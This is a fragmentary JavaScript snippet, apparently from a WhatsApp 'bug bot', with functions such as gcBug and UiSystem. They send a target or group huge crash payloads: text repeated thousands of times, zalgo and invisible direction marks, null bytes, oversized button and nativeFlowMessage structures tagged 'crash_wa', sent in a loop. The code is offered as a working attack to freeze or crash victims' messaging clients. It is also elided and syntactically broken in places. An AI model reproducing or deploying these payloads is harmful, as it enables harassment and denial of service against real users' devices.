...
      viewOnceMessage: {
        message: {
          conversation: "⃟O⃟B⃟L⃟I⃟V⃟I⃟O⃟N⃟".repeat(5000)
        }
      }
    }, { messageId: "⧉O⧉B⧉L⧉I⧉V⧉I⧉O⧉N⧉" });
...
    const bigButtons = Array.from({ length: 25 }, (_, i) => ({
      buttonId: btn${i},
      buttonText: { displayText: BTN ${i + 1} },
      type: 1
    }));
    await rich.sendMessage(target, {
      text: "G̵̾O̷̓D̶͆Ř̸E̴͝N̶̕D̴̛I̶͝N̸̛G̷̕ ̷͠A̸̛B̷̚Y̶͝S̵͝S̸̕".repeat(800),
      buttons: bigButtons,
      headerType: 1
    });

    await rich.sendMessage(target, { text: "\u200e".repeat(15000) });
    await rich.sendMessage(target, {
      nativeFlowMessage: {
        buttons: [{
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "⛧̶ Ø̴ ̷B̸ ̷L̶ ̴I̷ ̸V̴ ̵I̴ ̸Ø̷ ̴N̷ ⛧̶",
            id: "crash_wa"
          })
        }],
        messageParamsJson: JSON.stringify({
          title: "Lol",
          description: "TUNGGU & MACET",
          footer: "Oblviion"
        })
      }
    });
...
forwardingScore: 999,
            isForwarded: true,
                  ...
                  jpegThumbnail: "https://files.catbox.moe/na9c8t.jpg", //kosong
                },
                    contactVcard: true
                        },
...
async function gcBug(sock, target, amount = 10) {
  ...
  const stickerMeta = {
    packname: "꧁𑲭BUG𑲭꧂".repeat(100),
    author: "💀 SYSTEM FAILURE 💀" + "\u0000".repeat(2048)
  };
  ...
  for (let i = 0; i < amount; i++) {
    try {
      ...
      await sock.sendMessage(target, {
        ...
        contextInfo: {
          externalAdReply: {
            title: "🩸 GC SYSTEM BREACH ⚠️",
            body: "𑲭".repeat(2000) + "\u0000".repeat(1024),
            mediaType: 1,
      ...
      console.log(`[💥] Sent bug sticker ${i + 1}`);
    } catch (err) {
      console.error(`[❌] Error on ${i + 1}:`, err);
    }

    await delay(1300); // Slow it down to avoid socket lag
  }

  console.log("✅ GC crash bug completed.");
}
...
async function UiSystem(target) {
  const glitch = "꧅".repeat(9999) + "\u200F\u200E".repeat(9999);
